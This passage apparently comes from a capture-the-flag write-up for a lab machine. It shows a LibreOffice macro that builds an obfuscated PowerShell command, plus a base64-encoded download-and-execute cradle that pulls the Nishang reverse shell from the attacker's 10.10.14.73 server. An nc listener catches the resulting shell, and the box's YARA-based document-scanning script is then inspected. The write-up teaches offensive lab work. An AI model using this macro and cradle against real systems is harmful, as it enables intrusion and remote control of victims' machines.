<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ctf@6274ae97a895:/$ <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;ping -n 1 10.10.14.73&#34;</span> | xxd
00000000: <span style="color:#bd93f9">7069</span> 6e67 202d 6e20 <span style="color:#bd93f9">3120</span> <span style="color:#bd93f9">3130</span> 2e31 302e  ping -n <span style="color:#bd93f9">1</span> 10.10.
00000010: <span style="color:#bd93f9">3134</span> 2e37 330a                           14.73.
ctf@6274ae97a895:/$ <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;ping -n 1 10.10.14.73&#34;</span> | iconv -t utf-16le | xxd
00000000: <span style="color:#bd93f9">7000</span> <span style="color:#bd93f9">6900</span> 6e00 <span style="color:#bd93f9">6700</span> <span style="color:#bd93f9">2000</span> 2d00 6e00 <span style="color:#bd93f9">2000</span>  p.i.n.g. .-.n. .
00000010: <span style="color:#bd93f9">3100</span> <span style="color:#bd93f9">2000</span> <span style="color:#bd93f9">3100</span> <span style="color:#bd93f9">3000</span> 2e00 <span style="color:#bd93f9">3100</span> <span style="color:#bd93f9">3000</span> 2e00  1. .1.0...1.0...
00000020: <span style="color:#bd93f9">3100</span> <span style="color:#bd93f9">3400</span> 2e00 <span style="color:#bd93f9">3700</span> <span style="color:#bd93f9">3300</span> 0a00            1.4...7.3...
ctf@6274ae97a895:/$ <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;ping -n 1 10.10.14.73&#34;</span> | iconv -t utf-16le | base64 -w <span style="color:#bd93f9">0</span>
<span style="color:#8be9fd;font-style:italic">cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA3ADMACgA</span><span style="color:#ff79c6">=</span>
</code></pre></td></tr></table>
</div>
</div><p>We are succesful with the following macro. We can now simply replace variable h with any Base64 Encoded Powershell command</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">REM  *****  BASIC  *****
Sub Main
	<span style="color:#8be9fd;font-style:italic">a</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;cm&#34;</span>
	<span style="color:#8be9fd;font-style:italic">b</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;d /&#34;</span>
	<span style="color:#8be9fd;font-style:italic">c</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;c po&#34;</span>
	<span style="color:#8be9fd;font-style:italic">d</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;wershe&#34;</span>
	<span style="color:#8be9fd;font-style:italic">e</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;ll -enco&#34;</span>
	<span style="color:#8be9fd;font-style:italic">f</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;dedcom&#34;</span>
	<span style="color:#8be9fd;font-style:italic">g</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;mand &#34;</span>
	<span style="color:#8be9fd;font-style:italic">h</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA3ADMACgA=&#34;</span>
	Shell<span style="color:#ff79c6">(</span>a + b + c + d + e + f + g + h<span style="color:#ff79c6">)</span>
End Sub
</code></pre></td></tr></table>
</div>
</div><p>We want to build a more elaborated payload that will download and execute a powershell TCP Reverse Shell script from github.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ctf@6274ae97a895:~$ git clone https://github.com/samratashok/nishang
ctf@6274ae97a895:~$ <span style="color:#8be9fd;font-style:italic">cd</span> nishang/
ctf@6274ae97a895:~/nishang$ <span style="color:#8be9fd;font-style:italic">cd</span> Shells/
ctf@6274ae97a895:~/nishang/Shells$ cp Invoke-PowerShellTcp.ps1 ~/htb/http/shell.ps1
</code></pre></td></tr></table>
</div>
</div><p>Our macro should execute the following command, however we want it encoded in base64</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Shell(<span style="color:#f1fa8c">&#34;cmd /c powershell &#34;&#34;iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.73:8080/shell.ps1&#39;)&#34;&#34;&#34;</span>)
</code></pre></td></tr></table>
</div>
</div><p>To achieve this, we generate a new EncodedCommand to replace the base64 string above/</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ctf@6274ae97a895:~/htb$ <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;&#34;</span>iex<span style="color:#f1fa8c">\(</span>new-object net.webclient<span style="color:#f1fa8c">\)</span>.downloadstring<span style="color:#f1fa8c">\(\&#39;</span>http://10.10.14.73:8080/shell.ps1<span style="color:#f1fa8c">\&#39;\)</span><span style="color:#f1fa8c">&#34;&#34;</span> | iconv -t utf-16le | base64 -w <span style="color:#bd93f9">0</span>
<span style="color:#8be9fd;font-style:italic">aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcAMwA6ADgAMAA4ADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA</span><span style="color:#ff79c6">=</span>
</code></pre></td></tr></table>
</div>
</div><p>Once we submit the modified file, we observe the TCP reverse Shell is successfully uploaded on the victim</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ctf@6274ae97a895:~/htb/http$ python3 -m http.server <span style="color:#bd93f9">8080</span>
Serving HTTP on 0.0.0.0 port <span style="color:#bd93f9">8080</span> <span style="color:#ff79c6">(</span>http://0.0.0.0:8080/<span style="color:#ff79c6">)</span> ...
192.168.99.1 - - <span style="color:#ff79c6">[</span>15/Feb/2020 09:29:14<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /shell.ps1 HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> -
</code></pre></td></tr></table>
</div>
</div><p>and almost immediately we have our reverse tcp shell</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ctf@6274ae97a895:~$ rlwrap nc -lnvp <span style="color:#bd93f9">8000</span>
listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">8000</span> ...
connect to <span style="color:#ff79c6">[</span>172.17.0.2<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>192.168.99.1<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">63663</span>
Windows PowerShell running as user luke on RE
Copyright <span style="color:#ff79c6">(</span>C<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2015</span> Microsoft Corporation. All rights reserved.
PS C:<span style="color:#f1fa8c">\P</span>rogram Files<span style="color:#f1fa8c">\L</span>ibreOffice<span style="color:#f1fa8c">\p</span>rogram&gt;re<span style="color:#f1fa8c">\l</span>uke
    Directory: C:<span style="color:#f1fa8c">\P</span>rogram Files<span style="color:#f1fa8c">\L</span>ibreOffice<span style="color:#f1fa8c">\p</span>rogram
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/13/2019   6:47 PM                classes
PS C:<span style="color:#f1fa8c">\P</span>rogram Files<span style="color:#f1fa8c">\L</span>ibreOffice<span style="color:#f1fa8c">\p</span>rogram&gt; whoami
re<span style="color:#f1fa8c">\l</span>uke

PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\l</span>uke<span style="color:#f1fa8c">\D</span>esktop&gt; <span style="color:#8be9fd;font-style:italic">type</span> user.txt
</code></pre></td></tr></table>
</div>
</div><p>We get the user flag from the Desktop folder, then Looking at luke Document folder,
we can find the folder where ods file are processed, as well yara rules and a powershell script.
We use icalcs to check the powershell script belongs to Luke.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\l</span>uke<span style="color:#f1fa8c">\D</span>ocuments&gt; dir

    Directory: C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\l</span>uke<span style="color:#f1fa8c">\D</span>ocuments

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/15/2020   2:28 AM                malware_dropbox
d-----        2/15/2020   2:29 AM                malware_process
d-----        2/15/2020   2:29 AM                ods
-a----        6/18/2019  10:30 PM           <span style="color:#bd93f9">1096</span> ods.yara
-a----        6/18/2019  10:33 PM           <span style="color:#bd93f9">1783</span> process_samples.ps1
-a----        3/13/2019   6:47 PM        <span style="color:#bd93f9">1485312</span> yara64.exe

PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\l</span>uke<span style="color:#f1fa8c">\D</span>ocuments&gt; icacls process_samples.ps1
process_samples.ps1 NT AUTHORITY<span style="color:#f1fa8c">\S</span>YSTEM:<span style="color:#ff79c6">(</span>I<span style="color:#ff79c6">)(</span>F<span style="color:#ff79c6">)</span>
                    BUILTIN<span style="color:#f1fa8c">\A</span>dministrators:<span style="color:#ff79c6">(</span>I<span style="color:#ff79c6">)(</span>F<span style="color:#ff79c6">)</span>
                    RE<span style="color:#f1fa8c">\l</span>uke:<span style="color:#ff79c6">(</span>I<span style="color:#ff79c6">)(</span>F<span style="color:#ff79c6">)</span>
                    RE<span style="color:#f1fa8c">\c</span>oby:<span style="color:#ff79c6">(</span>I<span style="color:#ff79c6">)(</span>F<span style="color:#ff79c6">)</span>

Successfully processed <span style="color:#bd93f9">1</span> files; Failed processing <span style="color:#bd93f9">0</span> files
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s explore how the malware analysis automation works:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">PS </span>C:\Users\luke\Desktop&gt; <span style="color:#8be9fd;font-style:italic">cd </span>../Documents
<span style="color:#8be9fd;font-style:italic">PS </span>C:\Users\luke\Documents&gt; <span style="color:#8be9fd;font-style:italic">type </span>process_samples.ps1
<span style="color:#8be9fd;font-style:italic">$process_dir</span> = <span style="color:#f1fa8c">&#34;C:\Users\luke\Documents\malware_process&#34;</span>
<span style="color:#8be9fd;font-style:italic">$files_to_analyze</span> = <span style="color:#f1fa8c">&#34;C:\Users\luke\Documents\ods&#34;</span>
<span style="color:#8be9fd;font-style:italic">$yara</span> = <span style="color:#f1fa8c">&#34;C:\Users\luke\Documents\yara64.exe&#34;</span>
<span style="color:#8be9fd;font-style:italic">$rule</span> = <span style="color:#f1fa8c">&#34;C:\Users\luke\Documents\ods.yara&#34;</span>

<span style="color:#ff79c6">while</span>(<span style="color:#8be9fd;font-style:italic">$true</span>) {
        <span style="color:#6272a4"># Get new samples</span>
        <span style="color:#8be9fd;font-style:italic">move </span>C:\Users\luke\Documents\malware_dropbox\* <span style="color:#8be9fd;font-style:italic">$process_dir</span>

        <span style="color:#6272a4"># copy each ods to zip file</span>
        <span style="color:#8be9fd;font-style:italic">Get-ChildItem</span> <span style="color:#8be9fd;font-style:italic">$process_dir</span> -Filter *.ods |
        <span style="color:#8be9fd;font-style:italic">Copy-Item</span> -Destination {<span style="color:#8be9fd;font-style:italic">$_</span>.fullname <span style="color:#ff79c6">-replace</span> <span style="color:#f1fa8c">&#34;.ods&#34;</span>, <span style="color:#f1fa8c">&#34;.zip&#34;</span>}

        <span style="color:#8be9fd;font-style:italic">Get-ChildItem</span> <span style="color:#8be9fd;font-style:italic">$process_dir</span> -Filter *.zip | <span style="color:#8be9fd;font-style:italic">ForEach-Object</span> {

                <span style="color:#6272a4"># unzip archive to get access to content</span>
                <span style="color:#8be9fd;font-style:italic">$unzipdir</span> = <span style="color:#8be9fd;font-style:italic">Join-Path</span> <span style="color:#8be9fd;font-style:italic">$_</span>.directory <span style="color:#8be9fd;font-style:italic">$_</span>.Basename
                <span style="color:#8be9fd;font-style:italic">New-Item</span> -Force -ItemType directory -Path <span style="color:#8be9fd;font-style:italic">$unzipdir</span> | <span style="color:#8be9fd;font-style:italic">Out-Null</span>
                <span style="color:#8be9fd;font-style:italic">Expand-Archive</span> <span style="color:#8be9fd;font-style:italic">$_</span>.fullname -Force -ErrorAction SilentlyContinue -DestinationPath <span style="color:#8be9fd;font-style:italic">$unzipdir</span>

                <span style="color:#6272a4"># yara to look for known malware</span>
                <span style="color:#8be9fd;font-style:italic">$yara_out</span> = &amp; <span style="color:#8be9fd;font-style:italic">$yara</span> -r <span style="color:#8be9fd;font-style:italic">$rule</span> <span style="color:#8be9fd;font-style:italic">$unzipdir</span>
                <span style="color:#8be9fd;font-style:italic">$ods_name</span> = <span style="color:#8be9fd;font-style:italic">$_</span>.fullname <span style="color:#ff79c6">-replace</span> <span style="color:#f1fa8c">&#34;.zip&#34;</span>, <span style="color:#f1fa8c">&#34;.ods&#34;</span>
                <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$yara_out</span>.length <span style="color:#ff79c6">-gt</span> 0) {
                        <span style="color:#8be9fd;font-style:italic">Remove-Item</span> <span style="color:#8be9fd;font-style:italic">$ods_name</span>
                }
        }


        <span style="color:#6272a4"># if any ods files left, make sure they launch, and then archive:</span>
        <span style="color:#8be9fd;font-style:italic">$files</span> = <span style="color:#8be9fd;font-style:italic">ls </span><span style="color:#8be9fd;font-style:italic">$process_dir</span>\*.ods
        <span style="color:#ff79c6">if</span> ( <span style="color:#8be9fd;font-style:italic">$files</span>.length <span style="color:#ff79c6">-gt</span> 0) {
                <span style="color:#6272a4"># launch ods files</span>
                <span style="color:#8be9fd;font-style:italic">Invoke-Item</span> <span style="color:#f1fa8c">&#34;C:\Users\luke\Documents\malware_process\*.ods&#34;</span>
                <span style="color:#8be9fd;font-style:italic">Start-Sleep</span> -s 5

                <span style="color:#6272a4"># kill open office, sleep</span>
                <span style="color:#8be9fd;font-style:italic">Stop-Process</span> -Name soffice*
